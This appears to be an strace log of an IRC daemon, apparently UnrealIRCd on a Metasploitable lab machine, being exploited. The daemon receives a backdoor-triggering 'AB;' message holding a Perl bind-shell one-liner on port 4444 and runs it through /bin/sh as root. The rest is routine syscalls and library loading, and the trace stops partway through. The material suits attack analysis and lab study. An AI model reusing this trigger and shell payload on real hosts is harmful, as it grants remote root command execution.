4519  07:10:38.308017 select(1024, [2 3 4 7 9], [], NULL, {0, 990000}) = 1 (in [2], left {0, 820000})
4519  07:10:38.483299 clock_gettime(CLOCK_MONOTONIC, {1048, 300321583}) = 0
4519  07:10:38.483322 accept(2, 0, NULL) = 5
4519  07:10:38.483344 getpeername(5, {sa_family=AF_INET, sin_port=htons(39271), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:10:38.483377 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:10:38.483389 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:10:38.483403 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:10:38.483463 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:10:38.483476 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:10:38.483488 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:10:38.483503 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:10:38.483519 clock_gettime(CLOCK_MONOTONIC, {1048, 300532831}) = 0
4519  07:10:38.483531 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:10:38.483544 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:10:38.483553 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:10:38.483563 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:10:38.483573 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:10:38.483590 send(6, "R|\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:10:38.483651 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:10:38.483694 gettimeofday({1495624238, 483698}, NULL) = 0
4519  07:10:38.483706 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:10:38.486802 clock_gettime(CLOCK_MONOTONIC, {1048, 303834780}) = 0
4519  07:10:38.486855 recvfrom(6, "R|\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0~\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:10:38.486929 close(6)          = 0
4519  07:10:38.486957 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:10:38.486981 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:10:38.487059 time(NULL)        = 1495624238
4519  07:10:38.487072 time(NULL)        = 1495624238
4519  07:10:38.487086 gettimeofday({1495624238, 487090}, NULL) = 0
4519  07:10:38.487098 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:10:38.487225 clock_gettime(CLOCK_MONOTONIC, {1048, 304241082}) = 0
4519  07:10:38.487239 gettimeofday({1495624238, 487243}, NULL) = 0
4519  07:10:38.487251 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 430000})
4519  07:10:39.055709 clock_gettime(CLOCK_MONOTONIC, {1048, 872717723}) = 0
4519  07:10:39.055713 recv(7, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:10:39.055738 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055757 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055772 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055786 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055799 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055813 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055826 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055839 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055852 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055866 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055879 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055901 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055914 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055928 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055941 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055954 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055967 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055981 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.055994 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.056008 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.056073 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.056089 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:39.056136 gettimeofday({1495624239, 56139}, NULL) = 0
4519  07:10:39.056148 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:10:39.056188 clock_gettime(CLOCK_MONOTONIC, {1048, 873201296}) = 0
4519  07:10:39.056200 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:10:39.056228 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:10:39.056247 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:10:39.056260 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:10:39.056274 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 5777
5777  07:10:39.056342 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
5777  07:10:39.056356 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
5777  07:10:39.056367 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5777  07:10:39.056380 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
5777  07:10:39.056484 brk(0)            = 0x80f9000
5777  07:10:39.056506 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.056537 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f03000
5777  07:10:39.056583 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.056601 open("/etc/ld.so.cache", O_RDONLY) = 1
5777  07:10:39.056631 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5777  07:10:39.056651 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efb000
5777  07:10:39.056675 close(1)          = 0
5777  07:10:39.056686 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.056720 open("/lib/libncurses.so.5", O_RDONLY) = 1
5777  07:10:39.056748 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
5777  07:10:39.056947 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
5777  07:10:39.056998 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ecb000
5777  07:10:39.057010 mmap2(0xb7ef8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7ef8000
5777  07:10:39.057077 close(1)          = 0
5777  07:10:39.057090 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.057138 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5777  07:10:39.057152 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5777  07:10:39.057240 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5777  07:10:39.057257 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec7000
5777  07:10:39.057268 mmap2(0xb7ec9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ec9000
5777  07:10:39.057284 close(1)          = 0
5777  07:10:39.057295 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.057309 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5777  07:10:39.057323 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5777  07:10:39.057410 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5777  07:10:39.057426 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ec6000
5777  07:10:39.057440 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d77000
5777  07:10:39.057451 mmap2(0xb7ec0000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ec0000
5777  07:10:39.057468 mmap2(0xb7ec3000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec3000
5777  07:10:39.057482 close(1)          = 0
5777  07:10:39.057504 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d76000
5777  07:10:39.057512 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d766b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5777  07:10:39.057512 mprotect(0xb7ec0000, 4096, PROT_READ) = 0
5777  07:10:39.057512 munmap(0xb7efb000, 29913) = 0
5777  07:10:39.057513 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5777  07:10:39.057513 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
5777  07:10:39.057529 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf82b1e0) = -1 ENOTTY (Inappropriate ioctl for device)
5777  07:10:39.057558 brk(0)            = 0x80f9000
5777  07:10:39.057568 brk(0x80fa000)    = 0x80fa000
5777  07:10:39.057580 brk(0x80fb000)    = 0x80fb000
5777  07:10:39.057596 getuid32()        = 0
5777  07:10:39.057605 getgid32()        = 0
5777  07:10:39.057614 geteuid32()       = 0
5777  07:10:39.057623 getegid32()       = 0
5777  07:10:39.057636 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5777  07:10:39.057649 time(NULL)        = 1495624239
5777  07:10:39.057661 brk(0x80fc000)    = 0x80fc000
5777  07:10:39.057676 brk(0x80fd000)    = 0x80fd000
5777  07:10:39.057695 open("/proc/meminfo", O_RDONLY) = 1
5777  07:10:39.057717 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
5777  07:10:39.057735 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f02000
5777  07:10:39.057759 read(1, "MemTotal:      1035240 kB\nMemFree:        635492 kB\nBuffers:         63488 kB\nCached:         180984 kB\nSwapCached:          0 kB\nActive:         252060 kB\nInactive:       121376 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        635252 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5396 kB\nWriteback:           0 kB\nAnonPages:      128980 kB\nMapped:          52004 kB\nSlab:            15060 kB\nSReclaimable:     7092 kB\nSUnreclaim:       7968 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
5777  07:10:39.057888 close(1)          = 0
5777  07:10:39.057900 munmap(0xb7f02000, 4096) = 0
5777  07:10:39.057912 brk(0x80fe000)    = 0x80fe000
5777  07:10:39.057939 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5777  07:10:39.057952 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5777  07:10:39.057963 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5777  07:10:39.057975 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5777  07:10:39.057987 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
5777  07:10:39.057999 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
5777  07:10:39.058012 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5777  07:10:39.058023 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5777  07:10:39.058036 uname({sys="Linux", node="metasploitable", ...}) = 0
5777  07:10:39.058083 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5777  07:10:39.058101 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5777  07:10:39.058120 brk(0x8100000)    = 0x8100000
5777  07:10:39.058131 getcwd("/etc/unreal", 4096) = 12
5777  07:10:39.058145 getpid()          = 5777
5777  07:10:39.058161 getppid()         = 4519
5777  07:10:39.058177 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5777  07:10:39.058196 stat64("/sbin/sh", 0xbf82b1b8) = -1 ENOENT (No such file or directory)
5777  07:10:39.058208 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5777  07:10:39.058229 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5777  07:10:39.058268 socket(PF_FILE, SOCK_STREAM, 0) = 1
5777  07:10:39.058309 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5777  07:10:39.058321 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5777  07:10:39.058357 close(1)          = 0
5777  07:10:39.058369 socket(PF_FILE, SOCK_STREAM, 0) = 1
5777  07:10:39.058379 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5777  07:10:39.058389 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5777  07:10:39.058407 close(1)          = 0
5777  07:10:39.058420 open("/etc/nsswitch.conf", O_RDONLY) = 1
5777  07:10:39.058434 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5777  07:10:39.058451 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f02000
5777  07:10:39.058462 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5777  07:10:39.058510 read(1, "", 4096) = 0
5777  07:10:39.058519 close(1)          = 0
5777  07:10:39.058528 munmap(0xb7f02000, 4096) = 0
5777  07:10:39.058544 open("/etc/ld.so.cache", O_RDONLY) = 1
5777  07:10:39.058557 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5777  07:10:39.058573 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efb000
5777  07:10:39.058582 close(1)          = 0
5777  07:10:39.058593 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.058607 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
5777  07:10:39.058622 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
5777  07:10:39.058708 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
5777  07:10:39.058726 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d6d000
5777  07:10:39.058737 mmap2(0xb7d74000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d74000
5777  07:10:39.058765 close(1)          = 0
5777  07:10:39.058805 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5777  07:10:39.058833 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
5777  07:10:39.058847 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
5777  07:10:39.058950 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
5777  07:10:39.058968 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d55000
5777  07:10:39.058979 mmap2(0xb7d69000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d69000
5777  07:10:39.058994 mmap2(0xb7d6b000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d6b000
5777  07:10:39.059008 close(1)          = 0
5777  07:10:39.059033 munmap(0xb7efb000, 29913) = 0
5777  07:10:39.059051 open("/etc/ld.so.cache", O_RDONLY) = 1
